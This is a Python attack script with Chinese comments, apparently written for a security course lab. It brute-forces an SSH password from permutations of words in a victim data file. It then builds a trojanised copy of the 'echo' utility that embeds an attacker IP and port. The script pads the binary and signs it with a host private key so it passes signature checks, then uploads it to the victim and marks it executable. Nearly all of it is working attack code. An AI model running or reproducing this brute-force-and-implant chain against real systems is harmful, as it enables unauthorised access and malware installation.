#!/usr/bin/env python3
import itertools
import paramiko
import sys
import time
import subprocess

# 確保提供 3 個參數
if len(sys.argv) != 4:
    print("Usage: ./crack_attack <Victim IP> <Attacker IP> <Attacker port>")
    sys.exit(1)

victim_ip = sys.argv[1]
attacker_ip = sys.argv[2]
attacker_port = int(sys.argv[3])
username = "csc2025"

# 讀取 victim.dat
with open("/app/victim.dat", "r") as f:
    words = [line.strip() for line in f.readlines()]

# 產生可能的密碼組合
password_list = []
for i in range(1, len(words) + 1):
    password_list.extend(["".join(combo) for combo in itertools.permutations(words, i)])

# 嘗試 SSH 連線（加入 Retry 機制）
def try_ssh(password, retries=3):
    for attempt in range(retries):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(victim_ip, username=username, password=password, timeout=2)

            print(f"✔ 成功登入！密碼是：{password}")

            push_echo(client)

            client.close()
            exit(0)  # **找到密碼後立即退出**
        
        except paramiko.ssh_exception.AuthenticationException:
            print(f"❌ 密碼錯誤，跳過密碼：{password}")
            return  # **密碼錯誤，直接跳過，不重試**
        
        except (paramiko.ssh_exception.SSHException, EOFError):
            print(f"⚠ SSH 連線錯誤，重試（{attempt+1}/{retries}）...")
            time.sleep(1)  # **短暫等待後重試**
        
        except Exception as e:
            print(f"⚠ 未知錯誤：{e}")
            return  # **如果是未知錯誤，就直接跳過**


def prepare_echo(attacker_ip, attacker_port):
    private_key_path = "/app/certs/host.key"

    # 複製 echo 並壓縮、轉換成 C 可以處理的數據
    subprocess.run(["cp", "/usr/bin/echo", "orin_echo"], check=True)
    subprocess.run("gzip -c orin_echo > echo.gz", shell=True, check=True)
    subprocess.run("xxd -i echo.gz > echo_gz.h", shell=True, check=True)

    # 編譯 echo.c
    compile_cmd = f"gcc -o echo echo.c -DATTACKER_IP='\"{attacker_ip}\"' -DATTACKER_PORT={attacker_port}"
    subprocess.run(compile_cmd, shell=True, check=True)

    # 調整大小、附上簽名
    subprocess.run("truncate -s $((35208 - 512)) echo", shell=True, check=True)
    subprocess.run(f"openssl dgst -sha3-512 -sign {private_key_path} -out signature echo", shell=True, check=True)
    subprocess.run("tail -c 512 signature >> echo", shell=True, check=True)


# **🦠 嵌入壓縮病毒到 echo**
def push_echo(client):

    # 把echo傳給victim
    sftp = client.open_sftp()
    sftp.put("echo", "/app/echo")
    sftp.close()

    client.exec_command("chmod +x /app/echo")
    
    print(f"✔ 已成功上傳 ")


prepare_echo(attacker_ip, attacker_port)

print("開始攻擊...")
for password in password_list:
    print(f"嘗試密碼：{password}")
    try_ssh(password)

print("❌ 未找到密碼")

